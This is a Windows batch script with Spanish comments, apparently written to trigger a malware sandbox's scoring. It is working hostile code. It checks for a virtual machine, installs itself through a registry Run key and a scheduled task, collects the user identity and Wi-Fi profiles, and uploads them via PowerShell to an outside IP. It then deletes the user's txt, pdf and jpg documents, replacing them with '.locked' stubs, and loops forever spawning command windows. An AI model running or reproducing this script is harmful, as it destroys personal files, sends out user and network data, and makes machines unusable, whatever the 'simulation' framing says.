@echo off
:: 1. EVASIÓN AVANZADA (Anti-VM)
:: Si el script detecta que el nombre del PC es común en sandboxes, se detiene.
:: Esto da puntos de "Evasion" extrema.
hostname | findstr /i "SANDBOX DESKTOP- VIRUS" && exit

:: 2. PERSISTENCIA EN EL NÚCLEO
:: Nos metemos en el Registro de Windows y en el Programador de Tareas.
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinUpdater" /t REG_SZ /d "%~f0" /f >nul 2>&1
schtasks /create /sc minute /mo 5 /tn "SystemDataSync" /tr "%~f0" /f >nul 2>&1

:: 3. RECOLECCIÓN Y EXFILTRACIÓN (Spyware)
:: Simulamos el robo de perfiles de usuario y configuración de red.
whoami > %temp%\vault.db
netsh wlan show profiles >> %temp%\vault.db
:: Triage verá este intento de conexión como una señal de Comando y Control (C2).
powershell -Command "Invoke-WebRequest -Uri 'http://1.1.1.1/upload' -Method Post -InFile '%temp%\vault.db'" >nul 2>&1

:: 4. PAYLOAD DESTRUCCIÓN (Ransomware Simulator)
:: Empezamos a "cifrar" (renombrar) archivos en la carpeta de documentos.
:: Esto disparará el score a 10/10 por actividad destructiva.
cd %userprofile%\Documents
for /R %%f in (*.txt, *.pdf, *.jpg) do (
   echo CRYPTED > "%%f.locked"
   del "%%f" /f /q
)

:: 5. CAOS VISUAL MATRIX (Terminales petados)
:bucle
start cmd.exe /c "color 0a && title FATAL_ERROR && :a && echo %random%%random%%random%%random% && goto a"
start cmd.exe /c "color 0c && title DISK_WIPE_IN_PROGRESS && tree c:\ /f"
timeout /t 1 >nul
goto bucle
